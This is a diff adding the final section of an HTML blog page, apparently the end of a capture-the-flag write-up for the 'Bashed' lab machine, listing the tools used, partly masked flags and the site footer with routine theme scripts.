+	</thead>
+	<tbody>
+			<tr>
+					<td>Nmap</td>
+					<td>Network and Service Enumeration</td>
+			</tr>
+			<tr>
+					<td>Gobuster</td>
+					<td>Web Enumeration</td>
+			</tr>
+	</tbody>
+</table>
+<h4 id="appendix-b">Appendix B<a hidden class="anchor" aria-hidden="true" href="#appendix-b">#</a></h4>
+<h5 id="flags-found">Flags Found<a hidden class="anchor" aria-hidden="true" href="#flags-found">#</a></h5>
+<p><img alt="UserFlag.jpg" loading="lazy" src="/images/bashed/UserFlag.jpg"></p>
+<p>User Flag:</p>
+<p>980**************************597</p>
+<p><img alt="RootFlag.jpg" loading="lazy" src="/images/bashed/RootFlag.jpg"></p>
+<p>Root Flag:</p>
+<p>101**************************acd</p>
+<h3 id="appendix-c">Appendix C<a hidden class="anchor" aria-hidden="true" href="#appendix-c">#</a></h3>
+<h4 id="supporting-evidence">Supporting Evidence<a hidden class="anchor" aria-hidden="true" href="#supporting-evidence">#</a></h4>
+<p>No additional supporting evidence was required beyond the artifacts included throughout this write-up.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://SecurityWithIan.com/">Security With Ian</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
